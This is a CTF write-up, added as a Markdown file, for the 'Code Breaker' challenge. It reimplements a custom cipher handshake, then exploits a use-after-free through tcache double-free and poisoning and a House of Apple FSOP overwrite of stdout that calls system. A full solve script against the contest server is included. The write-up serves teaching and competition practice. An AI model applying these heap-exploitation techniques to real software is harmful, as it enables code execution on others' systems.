@@ -1,0 +1,290 @@
+---
+title: 'SunshineCTF 2026 - Code Breaker'
+description: 'Reversing a custom key exchange and stream cipher to get on the wire, then a refcounted free that leaves a live pointer, ending in House of Apple on _IO_2_1_stdout_'
+date: 2026-09-30
+tags: ['writeup', 'pwn', 'crypto', 'heap-exploitation', 'use-after-free', 'fsop', 'sunshinectf', '2026']
+authors: ['kudaliar']
+draft: false
+---
+
+Two challenges stacked on one another. Every byte after the handshake is encrypted with a bespoke cipher, so the heap bug is unreachable until the crypto is reimplemented. Once on the wire, `free` is called unconditionally while the slot is only cleared when a refcount hits zero — a use-after-free with both read and write.
+
+The finish is forced by an unusual constraint: there is **no arbitrary read**, because every allocation memcpys your own data over the chunk it just returned. That rules out leaking PIE, which rules out the obvious function-pointer target, which leaves FSOP inside libc.
+
+## Challenge Description
+
+> CodeBreaker: enterprise-grade encrypted key-value storage. All traffic is encrypted with our proprietary cipher. Your data has never been safer.
+
+Provided: `code_breaker`, `libc.so.6`, `ld-linux-x86-64.so.2`. Stripped, PIE, canary, FORTIFY, Partial RELRO.
+
+## The protocol
+
+Connecting produces 19 bytes:
+
+```text
+00000000: 0011 010e 97be dcef 5da7 481c 59b6 fdbc  ........].H.Y...
+00000010: fd11 b1                                  ...
+```
+
+`00 11` is a big-endian length of 17, then a payload of `01` plus sixteen bytes read from `/dev/urandom`. The framing is `len (2 bytes, big endian) | payload`; the handshake is plaintext and everything after it is encrypted.
+
+Three steps, from `0x1670`:
+
+1. **Server to you**: `01` + 16 random bytes.
+2. **You to server**: `02` + 16 bytes of your choice. The length check is `cmp WORD PTR [rsp+0xc],0x10 / jbe fail`, so it must be **greater** than 16.
+3. Both sides derive the key, both counters are zeroed, and you send `03` + a 16-byte proof, encrypted at counter 0. The server then sends an unsolicited `04 00` ack — consume it, or every later reply looks shifted by one command.
+
+### Key schedule
+
+At `0x1755`, with `material = nonce || your sixteen bytes` and the state zeroed:
+
+```asm
+1790:  lea    edx,[rsi+rax*1]
+179b:  and    edx,0x1f
+179e:  movzx  edx,BYTE PTR [rsp+rdx*1+0x20]   ; material[(i + 8r) & 31]
+17a3:  xor    dl,BYTE PTR [rax-0x1]           ; ^= state[i]
+17a9:  movzx  edx,BYTE PTR [rbp+rdx*1]        ; SBOX lookup
+17ae:  xor    dl,BYTE PTR [rcx-0x1]           ; ^= material[3r + i]
+17b1:  rol    dl,0x3
+17b4:  mov    BYTE PTR [rax-0x1],dl           ; state[i] = ...
+```
+
+Four rounds:
+
+```python
+def derive_key(nonce16, mine16):
+    mat = bytes(nonce16) + bytes(mine16)
+    st = bytearray(16)
+    for r in range(4):
+        for i in range(16):
+            t = mat[(i + 8*r) & 31] ^ st[i]
+            t = SBOX[t]
+            t ^= mat[3*r + i]
+            st[i] = rol8(t, 3)
+    return bytes(st)
+```
+
+`SBOX` is 256 distinct bytes at `.rodata:0x2040`. The important observation is that **you supply half the material and are handed the other half**, so the key is fully computable client-side. This is a key exchange, not a challenge-response — there is nothing to brute-force.
+
+### Stream cipher
+
+At `0x19a8`, and again at `0x1810` for the handshake message:
+
+```asm
+19ab:  lea    eax,[rdi+rdx*1]        ; counter + i
+19b1:  and    esi,0xf
+19b4:  add    al,BYTE PTR [r14+rsi*1]     ; += key[i & 15]
+19bb:  movzx  eax,BYTE PTR [r12+rax*1]    ; SBOX[...]
+19c0:  xor    BYTE PTR [rdx],al
+```
+
+So `keystream[i] = SBOX[(counter + i + key[i & 15]) & 0xff]`, with independent counters per direction (`0x42c0` inbound, `0x42c4` outbound), each advanced by the message length.
+
+### Proof
+
+At `0x1860`, checked against the 16 bytes of the type-3 message:
+
+```python
+def mac_for(key):
+    return bytes(key[(i + 5) & 15] ^ SBOX[key[i]] for i in range(16))
+```
+
+With those three pieces the client is on the wire and every command responds.
+
+## The commands
+
+Jump table at `0x2020`, opcodes `0x10` to `0x16`. Slots live at `0x41c0`, sixteen entries of `ptr, size (2 bytes), refcount (2 bytes)`:
+
+```text
+0x10  alloc    idx, size (BE16, 1..0x400), then data; refcount = 1
+0x11  read     returns the slot contents
+0x12  write    into the slot, bounded by the stored size
+0x13  free
+0x14  alias    copy one slot onto another, bumping refcount
+0x15  copies your data to a stack buffer and calls the pointer at 0x40c0 with it
+0x16  status
+```
+
+## The Vulnerability
+
+`free` runs unconditionally, but the slot is only cleared once the refcount reaches zero:
+
+```asm
+1b19:  call   1100 <free@plt>
+1b1e:  sub    WORD PTR [r13+0xa],0x1     ; refcount--
+1b24:  jne    1b33                       ; non-zero -> pointer stays in the slot
+1b28:  mov    WORD PTR [r13+0x8],0x0
+1b2f:  mov    QWORD PTR [r13+0x0],rsi
+```
+
+So `alloc` then `alias` then `free` leaves a live pointer to a freed chunk, which `0x11` still reads and `0x12` still writes.
+
+## Exploitation
+
+### libc
+
+Nine allocations of `0x400`, free seven to fill `tcache[0x410]`, then alias the eighth and free it — with the bin full it lands in the unsorted bin, and the UAF read returns the arena pointers:
+
+```text
+  fd = 0x717474e03b20
+  bk = 0x717474e03b20
+  same (unsorted): True
+```
+
+Checked against `/proc/pid/maps` locally, that is `libc + 0x203b20`.
+
+The first attempt at this quietly failed because one `alloc` was aimed at an already-occupied slot — `alloc` requires the slot to be empty and silently does nothing otherwise, so only six chunks reached the bin and the eighth free went to tcache like the rest.
+
+### Heap
+
+Two chunks in a fresh size class, freed in order. The first free into an empty bin gives `A >> 12`; the second's `fd` is `(B >> 12) ^ A`, and both sit on the same page:
+
+```text
+  fd2 ^ page = 0x5b14c7a130f0
+```
+
+### tcache dup
+
+glibc 2.39 catches the naive double free with the `key` field. But the UAF write reaches that field, so zeroing it defeats the check outright:
+
+```python
+c.cmd(FREE(a))
+page = struct.unpack("<Q", c.cmd(READ(a))[4:12])[0]
+c.cmd(WRITE(a, p64(0) + p64(0)))      # clear fd and the double-free key
+c.cmd(FREE(a))                        # bin now holds a twice
+c.cmd(WRITE(a, p64(page ^ target)))   # head -> target
+```
+
+Two allocations later, the second one is served at `target`.
+
+### Why FSOP, and not the function pointer
+
+Command `0x15` calls the pointer at `0x40c0` with a buffer holding your data, which is an obvious win — point it at `system` and send `/bin/sh`. But `0x40c0` is PIE-relative, and there is **no way to leak PIE**, because there is no arbitrary read:
+
+```asm
+1cc1:  call   1190 <malloc@plt>
+1cd2:  lea    rsi,[rsp+0x34]
+1cdd:  call   1170 <__memcpy_chk@plt>    ; your data, over the chunk just returned
+```
+
+Every allocation copies your own bytes over the chunk it hands back, so "reading" an arbitrary address only ever returns what you just wrote there. With no read primitive, the target has to be somewhere already known — which means inside libc.
+
+### House of Apple on stdout
+
+Write a fake FILE over `_IO_2_1_stdout_`, exactly `0xe0` bytes so nothing past the struct is disturbed, with the fake `_wide_data` living in a heap chunk written through the UAF:
+
+```python
+V = heap + 0x100
+wide = bytearray(0x200)
+wide[0x38:0x40]   = p64(0)                 # _IO_buf_base == NULL
+wide[0xe0:0xe8]   = p64(V)                 # _wide_vtable
+wide[0x168:0x170] = p64(libc + SYSTEM)     # V + 0x68 = __doallocate
+
+fp = bytearray(0xe0)
+fp[0x00:0x0e] = b"  cat flag.txt"          # _flags, and system()'s argument
+fp[0x20:0x28] = p64(0)                     # _IO_write_base
+fp[0x28:0x30] = p64(1)                     # _IO_write_ptr > base -> overflow runs
+fp[0x88:0x90] = p64(heap + 0x1f0)          # _lock
+fp[0xa0:0xa8] = p64(heap)                  # _wide_data
+fp[0xc0:0xc4] = struct.pack("<I", 0)       # _mode = 0
+fp[0xd8:0xe0] = p64(libc + IO_WFILE_JUMPS) # vtable
+```
+
+Three details decide whether this fires:
+
+**`_flags` doubles as the command string.** It is the first eight bytes of the struct and also what `system` receives as `rdi`. The leading spaces keep the low byte at `0x20`, which leaves `_IO_UNBUFFERED` (`0x2`), `_IO_NO_WRITES` (`0x8`) and `_IO_CURRENTLY_PUTTING` (`0x800`) all clear — every one of which would otherwise divert `_IO_wfile_overflow` before it reaches the allocation path.
+
+**`_lock` must point at writable memory.** `_IO_flockfile` dereferences it before anything else in the flush loop. Leaving it NULL produces a bare segfault at exit with no other symptom — that cost a debugging round on its own:
+
+```text
+exit status: -11      # _lock = NULL
+exit status: 0        # _lock = heap + 0x1f0, and the flag comes back
+```
+
+**The trigger is EOF.** The binary imports no `exit` or `_exit`, so the only way out of the loop is a recv error. `shutdown(SHUT_WR)` makes `main` return, glibc's exit path runs `_IO_cleanup`, the flush hits the fake vtable and `system` runs. Output still comes back on the socket even with the write half closed — which is why the payload is `cat flag.txt` rather than a shell, since a shell would have no way to receive commands.
+
+```text
+OUT: b'sun{cr4ck_tHe_ciPh3r_fr33_thE_heaP}\n'
+```
+
+## Solve Script
+
+```python
+import struct, socket, time
+p64 = lambda x: struct.pack("<Q", x)
+
+MAIN_ARENA_LEAK = 0x203b20      # what a lone unsorted chunk's fd points at
+SYSTEM          = 0x58740
+IO_STDOUT       = 0x2045c0
+IO_WFILE_JUMPS  = 0x202228      # Ubuntu GLIBC 2.39-0ubuntu8.3
+
+def leak_libc(c, size=0x400):
+    """9 allocations, 7 freed to fill tcache, the 8th lands in the unsorted bin."""
+    for i in range(9):
+        c.cmd(ALLOC(i, b"L" * size))
+    for i in range(7):
+        c.cmd(FREE(i))
+    c.cmd(ALIAS(9, 7)); c.cmd(FREE(7))          # alias keeps the pointer alive
+    fd = struct.unpack("<Q", c.cmd(READ(7))[4:12])[0]
+    return fd - MAIN_ARENA_LEAK
+
+def leak_heap(c, sa, sb, size=0x200):
+    """First free (empty bin) gives A>>12; the second's fd is (B>>12) ^ A."""
+    c.cmd(ALLOC(sa, b"H"*size)); c.cmd(ALIAS(sa+2, sa))
+    c.cmd(ALLOC(sb, b"H"*size)); c.cmd(ALIAS(sb+2, sb))
+    c.cmd(FREE(sa))
+    page = struct.unpack("<Q", c.cmd(READ(sa))[4:12])[0]
+    c.cmd(FREE(sb))
+    fd = struct.unpack("<Q", c.cmd(READ(sb))[4:12])[0]
+    return page, fd ^ page
+
+def poison(c, size, target, slots):
+    """UAF write clears the tcache key, frees twice, then redirects fd."""
+    a, x, y, q1, q2 = slots
+    c.cmd(ALLOC(a, b"P"*size)); c.cmd(ALIAS(x, a)); c.cmd(ALIAS(y, a))
+    c.cmd(FREE(a))
+    page = struct.unpack("<Q", c.cmd(READ(a))[4:12])[0]
+    c.cmd(WRITE(a, p64(0) + p64(0)))
+    c.cmd(FREE(a))
+    c.cmd(WRITE(a, p64(page ^ target)))
+    return page
+
+def pwn(target, command=b"  cat flag.txt"):
+    c, _, key = connect(target)
+    libc = leak_libc(c)
+    page, heap = leak_heap(c, 10, 11)
+
+    V = heap + 0x100
+    wide = bytearray(0x200)
+    wide[0x38:0x40]   = p64(0)
+    wide[0xe0:0xe8]   = p64(V)
+    wide[0x168:0x170] = p64(libc + SYSTEM)
+    c.cmd(WRITE(10, bytes(wide)))
+
+    fp = bytearray(0xe0)
+    fp[0x00:0x00+len(command)] = command
+    fp[0x20:0x28] = p64(0)
+    fp[0x28:0x30] = p64(1)
+    fp[0x88:0x90] = p64(heap + 0x1f0)          # _lock - NULL here just segfaults
+    fp[0xa0:0xa8] = p64(heap)
+    fp[0xc0:0xc4] = struct.pack("<I", 0)
+    fp[0xd8:0xe0] = p64(libc + IO_WFILE_JUMPS)
+
+    for i in range(5):
+        c.cmd(FREE(i))                          # recycle slots 0..4
+    poison(c, 0xe0, libc + IO_STDOUT, [0, 1, 2, 3, 4])
+    c.cmd(ALLOC(3, b"Q"*0xe0))                  # pops the poisoned chunk itself
+    c.cmd(ALLOC(4, bytes(fp)))                  # lands on _IO_2_1_stdout_
+    return c
+
+c = pwn(("chal.sunshinectf.games", 26005))
+c.s.shutdown(socket.SHUT_WR)                    # EOF -> exit -> _IO_cleanup -> system
+time.sleep(2.0)
+print(b"".join(c._raw(65536) for _ in range(6)))
+```
+
+## Flag
+
+```text
+sun{cr4ck_tHe_ciPh3r_fr33_thE_heaP}
+```
